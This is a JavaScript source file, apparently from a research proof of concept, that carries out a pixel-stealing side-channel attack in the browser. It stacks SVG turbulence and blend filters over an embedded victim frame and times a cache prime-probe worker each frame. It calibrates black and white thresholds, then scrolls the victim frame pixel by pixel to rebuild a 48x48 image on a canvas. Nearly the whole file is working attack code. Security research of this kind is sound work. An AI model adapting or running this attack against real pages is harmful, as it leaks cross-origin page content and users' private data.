// global halting flag to stop the attack
let haltFlag;

// starting warmup before the whole attack
let warmupTime;

let pixel;
let inner_frame;
let scroll;
let frame;

let all_time; // 2d array
let rept;
let time_collect;
let pp_worker;

// div size and layer number
let div_size;
let layer_num;

let test_mode; // true if we just want to see b/w difference without pixel stealing

// threshold
let low;
let high;

let bwStatistics; // object to store values useful for threshold

// the current scrollLeft and scrollTop, always reflect the current offset of victim frame
let x, y = 0;

function updateStatus(newText) {
    document.getElementById("status").innerHTML = newText;
}

let onFrameStart = () => { };

async function foreverRender() {
    pixel.classList.remove("timing2");
    pixel.classList.add("timing1");
    requestAnimationFrame(async function () {
        await onFrameStart();
        pixel.classList.remove("timing1");
        pixel.classList.add("timing2");
        requestAnimationFrame(async function () {
            await onFrameStart();
            foreverRender();
        });
    });
}

let onWorkerMessage = () => { };
let frameResolve = [() => { }];
let currentArrayIndirect = [];
// within collect_time amount of time, set the per-frame onFrameStart to collect worker data
// one observation is that it takes less than 16ms to probe all set, so the synchronization should be correct
async function collectTimeArray(array) {
    currentArrayIndirect[0] = array;
    let finished = false;
    onWorkerMessage = e => {
        currentArrayIndirect[0].push(e.data); // cuz if we just do array.push, it will keep pushing to the same array
        frameResolve[0]();
        finished && pp_worker.removeEventListener('message', onWorkerMessage);
    };
    pp_worker.addEventListener('message', onWorkerMessage);

    onFrameStart = () => new Promise((resolve, _reject) => {
        // by just setting a resolve reference instead of redefining the whole onWorkerMessage,  
        // we can keep the workload of every onFrameStart minimum
        frameResolve[0] = resolve;
        pp_worker.postMessage({});
    });

    await (() => new Promise((resolve, _rej) => {
        setTimeout(() => {
            resolve();
        }, time_collect);
    }))();
    currentArrayIndirect[0] = [];
    onFrameStart = () => { };

    // we cannot directly remove onWorkerMessage here because 
    // then RAF could be waiting for a promise that will never resolve
    finished = true;
}

// prefill some parameters
const adjustDivSize = () => {
    // now we just make it a small enough value that doesn't blow up the whole LLC
    document.getElementById("div_size").value = 1000;
}
document.addEventListener('DOMContentLoaded', adjustDivSize, false);


function filter_content() {
    let filter = " <filter> \n ";
    filter += `<feTurbulence type="turbulence" baseFrequency="0.9 0.9" numOctaves="1" seed="1" stitchTiles="stitch" x="0" y="0" width="${div_size}px" height="${div_size}px" result="turbulence"/> \n`;
    filter += `<feBlend in="SourceGraphic" in2="turbulence" mode="multiply" result="x1"/> \n`;
    for (let i = 1; i < layer_num; i++) {
        filter += `<feBlend in="SourceGraphic" in2="x${i}" mode="multiply" result="x${i + 1}"/> \n`;
    }
    return filter;
}

// helper function for synchronization
function waitSomeFrames(numFrames) {
    return new Promise((resolve, _reject) => {
        let count = numFrames;
        const rafBody = () => {
            if (count > 0) {
                console.log("frame count, ", count)
                count--;
                requestAnimationFrame(rafBody);
            } else {
                resolve();
            }
        };
        requestAnimationFrame(rafBody);
    });
}


/**************** reconstruct *****************/
function setUpParams(scroll = true) {
    haltFlag = false;
    pixel = document.getElementById("pixel");
    low = parseFloat(document.getElementById("low").value);
    high = parseFloat(document.getElementById("high").value);
    div_size = parseInt(document.getElementById("div_size").value, 10);
    layer_num = parseInt(document.getElementById("layer").value, 10);
    warmupTime = 1000 * parseInt(document.getElementById("warmup_time").value, 10);
    test_mode = document.getElementById("test-mode").checked;

    // change size
    frame = document.getElementById("frame");
    frame.style.width = div_size + 'px';
    frame.style.height = div_size + 'px';

    changeSecondaryFrameSize(div_size);

    // set the filter
    let filterContent = filter_content();
    console.log(filterContent);
    document.getElementById('filter-input').value = filterContent;
    const svgElem1 = document.getElementById("input-filter1");
    svgElem1.innerHTML = document.getElementById("filter-input").value;
    svgElem1.children[0].id = 'filter1';
    const svgElem2 = document.getElementById("input-filter2");
    svgElem2.innerHTML = document.getElementById("filter-input").value;
    svgElem2.children[0].id = 'filter2';

    // scroll to the pixel frame
    scroll && pixel.scrollIntoView();
}

// the main entry function
async function reconstruct() {
    setUpParams();
    // start the attack
    attack();
}

async function attack() {
    await changeFrameSrc("chrome-embed-zoom-white.html");
    changeSecondaryFrameSize(div_size);

    pp_worker = new Worker("ccm.js");
    const start = performance.now();
    await warmup(start, warmupTime);

    // Find Threshold: alternate black and white for time_collect for some number of repetition
    all_time = {};

    time_collect = parseInt(document.getElementById("time").value, 10);
    rept = parseInt(document.getElementById("repetition").value, 10);

    let curr_bw = 0;
    let curr_rep = 0;

    foreverRender();

    console.log("finding threshold");
    for (let i = 0; i < rept; i++) {
        console.log("i", i);
        curr_rep = i;
        if (curr_bw == 0) { // black
            // change the frame source to our reference black
            await changeFrameSrc("chrome-embed-zoom-black.html");
            console.log("Gello?", i);
            changeSecondaryFrameSize(div_size);
        } else { // white
            // change the frame source to our reference white
            await changeFrameSrc("chrome-embed-zoom-white.html");
            console.log("Gello?", i);
            changeSecondaryFrameSize(div_size);
        }
        console.log("Hello?", i);
        await waitSomeFrames(1);
        all_time[curr_rep] = [];

        await collectTimeArray(all_time[curr_rep]);
        console.log("all_time[curr_rep]", all_time[curr_rep]);
        curr_bw = 1 - curr_bw;
    }
    // black: {} iteration i-> timer array
    // white: {} iteration i-> timer array
    calculateBWStatistics();
    updateStatus(`Black Mean: ${bwStatistics.blackMean} White Mean: ${bwStatistics.whiteMean}`);

    if (!test_mode) {
        // Start the real attack
        // 1. Load the victim frame
        await changeFrameSrc("chrome-embed-zoom-scroll.html");
        changeSecondaryFrameSize(div_size);

        // 2. Loop through 48*48 (the pixels we want to steal from our poc victim) and compare the timer with cutt off and fill the reconstruction canvas
        let currentTimeArray = [];
        let error = 0;
        let start_attack = performance.now();
        for (let i = 0; i < 48; i += 1) {
            for (let j = 0; j < 48; j += 1) {
                let ret = -1;
                while (ret == -1) {
                    console.log(`constructing (${i}, ${j})`);
                    scrollFrame(i, j);
                    await waitSomeFrames(1);
                    await collectTimeArray(currentTimeArray);
                    let reading = currentTimeArray;
                    ret = isLikelyWhite(reading);
                    if (ret == 1) {
                        console.log("white");
                        paintPixel("#ffffff");
                    } else if (ret == 0) {
                        console.log("black");
                        paintPixel("#000000");
                    }
                    currentTimeArray = [];
                }
                error = error + checkerror(i, j, ret);
            }
        }

        let end_attack = performance.now();
        console.log("total time", end_attack - start_attack);
        console.log("total error", error);
    }
}


let holder = [];
async function warmup(start, total_time) { // warm up prime probe 
    return new Promise(function (resolve, reject) {
        const ppListener = e => {
            if (performance.now() < (start + total_time)) {
                holder.push(e.data);
                pp_worker.postMessage({});
            } else {
                pp_worker.removeEventListener('message', ppListener);
                console.log(`warm up readings: ${holder}, mean after thresholding ${getMean(holder)}`);
                resolve();
            }
        }

        pp_worker.addEventListener('message', ppListener);
        pp_worker.postMessage({});
    });
}

// paint the next pixel on the reconstruction canvas
// color: hex value e.g. #000000 black or #ffffff white
// the x,y offsets are shared with the victim frame
// x=scrollLeft y=scrollTop
function paintPixel(color) {
    let canvas = document.getElementById("canvas");
    ctx = canvas.getContext("2d");
    ctx.fillStyle = color;
    ctx.fillRect(x, y, 1, 1);
}

// scroll the victim frame
function scrollFrame(scrollLeft, scrollTop) {
    frame = document.getElementById("frame");
    scroll = frame.contentWindow.document.getElementById('scroll');
    x = scroll.scrollLeft = scrollLeft;
    y = scroll.scrollTop = scrollTop;
}

function changeFrameSrc(newSrc) {
    return new Promise(function (resolve, reject) {
        frame = document.getElementById("frame");
        frame.src = newSrc;
        frame.onload = function () { resolve(); }
    });
}

// input: all_time, 2D array of alternate B-W readings 
function calculateBWStatistics() {
    // 1. put all black data together, and all white data together
    // even is black, odd is white
    let bwArr = [[], []];
    for (let i = 20; i < rept; i += 1) {
        let b_or_w = i & 1;
        // trim first 10 percent data
        bwArr[b_or_w] = bwArr[b_or_w].concat(all_time[i].slice(Math.floor((all_time[i].length) / 10)));
    }
    bwArr[0].sort(function (a, b) { return a - b });
    bwArr[1].sort(function (a, b) { return a - b });
    // 2. remove top 10% and bottom 10% by slicing
    bwArr[0] = bwArr[0].slice(Math.floor((bwArr[0].length) / 10), Math.floor(9 * (bwArr[0].length) / 10));
    bwArr[1] = bwArr[1].slice(Math.floor((bwArr[1].length) / 10), Math.floor(9 * (bwArr[1].length) / 10));
    // 3. get mean and median 
    const bMean = bwArr[0].reduce((a, b) => a + b) / bwArr[0].length;
    const bStd = Math.sqrt(bwArr[0].reduce((s, n) => s + (n - bMean) ** 2, 0) / (bwArr[0].length - 1));
    const wMean = bwArr[1].reduce((a, b) => a + b) / bwArr[1].length;
    const wStd = Math.sqrt(bwArr[1].reduce((s, n) => s + (n - wMean) ** 2, 0) / (bwArr[1].length - 1));
    bwStatistics = {
        blackMean: bMean,
        blackMedian: bwArr[0][Math.floor(bwArr[0].length / 2)],
        blackLow: bwArr[0][0],
        blackStd: bStd,
        whiteMean: wMean,
        whiteMedian: bwArr[1][Math.floor(bwArr[1].length / 2)],
        whiteLow: bwArr[1][0],
        whiteStd: wStd,
    };
}

// reading: 1D array collected from the timer
// output: 1 if we think it is white, 0 if we think it is black, -1 undecided
function isLikelyWhite(reading) {
    // trim first 10 percent data when the code is not warmed up enough
    let reading_trim = reading.slice(Math.floor((reading.length) / 10));
    // remove top 10% and bottom 10% by slicing
    reading_trim.sort(function (a, b) { return a - b });
    reading_trim = reading_trim.slice(Math.floor(reading_trim.length / 10), Math.floor(9 * (reading_trim.length) / 10));

    const readingMean = reading_trim.reduce((a, b) => a + b) / reading_trim.length;
    const readingMedian = reading_trim[Math.floor(reading_trim.length / 2)];

    let ret = -1;

    let white_median_threshold = bwStatistics.whiteMedian + (bwStatistics.blackMedian - bwStatistics.whiteMedian) * high;
    let white_mean_threshold = bwStatistics.whiteMean + (bwStatistics.blackMean - bwStatistics.whiteMean) * high;
    if ((readingMedian > white_median_threshold) && (readingMean > white_mean_threshold)) {
        ret = 1;
    }

    let black_median_threshold = bwStatistics.whiteMedian + (bwStatistics.blackMedian - bwStatistics.whiteMedian) * low;
    let black_mean_threshold = bwStatistics.whiteMean + (bwStatistics.blackMean - bwStatistics.whiteMean) * low;
    if ((readingMedian < black_median_threshold) && (readingMean < black_mean_threshold)) {
        ret = 0;
    }
    return ret;
}


/************ check for error ********* */

// black 0, white 1
function checkerror(x, y, color) {
    let color_x_y = 1 - ((Math.floor(x / 12) + Math.floor(y / 12)) % 2);
    if (color_x_y == color) {
        return 0;
    }
    return 1;
}

/************ inter-frame set up ********* */
function changeSecondaryFrameSize(size) {
    frame = document.getElementById("frame");
    frame.contentWindow.postMessage({
        size
    });
}

///////////////// helpful unit testing code
let testWorker;
let workerData;
function testCCM() {
    testWorker = new Worker("ccm.js");
    testWorker.onmessage = e => {
        console.log(e.data);
        workerData = e.data;
        console.log(`Mean: ${getMean(e.data)}`);
    };
    testWorker.postMessage({ mode: "measure", time_collect_ms: 30000 });
    console.log("set up");
}

function testCCMMulti() {
    testWorker = new Worker("ccm.js");
    testWorker.onmessage = e => {
        console.log(e.data);
        workerData = e.data;
        console.log(`Mean: ${getMean(e.data)}`);
        testWorker.postMessage({ mode: "measure", time_collect_ms: 30000 });
    };
    testWorker.postMessage({ mode: "measure", time_collect_ms: 30000 });
    console.log("set up");
}

function test() {
    testCCM();
}

let testRendering = false;
async function renderBlack() {
    setUpParams(false);
    await changeFrameSrc("chrome-embed-zoom-black.html");
    testRendering || (testRendering = true && foreverRender());
}

async function renderWhite() {
    setUpParams(false);
    await changeFrameSrc("chrome-embed-zoom-white.html");
    testRendering || (testRendering = true && foreverRender());
}

function postWorker() {
    testWorker.onmessage = e => {
        workerData = e.data;
    };
    testWorker.postMessage({ mode: "peek" });
}

function getMean(resultArray) {
    resultArray = resultArray.slice(Math.floor((resultArray.length) / 5));
    resultArray.sort(function (a, b) { return a - b });
    resultArray = resultArray.slice(Math.floor(resultArray.length / 20), Math.floor(19 * (resultArray.length) / 20));
    // console.log(`processed: ${resultArray}`);
    return resultArray.reduce((a, b) => a + b) / resultArray.length;
}

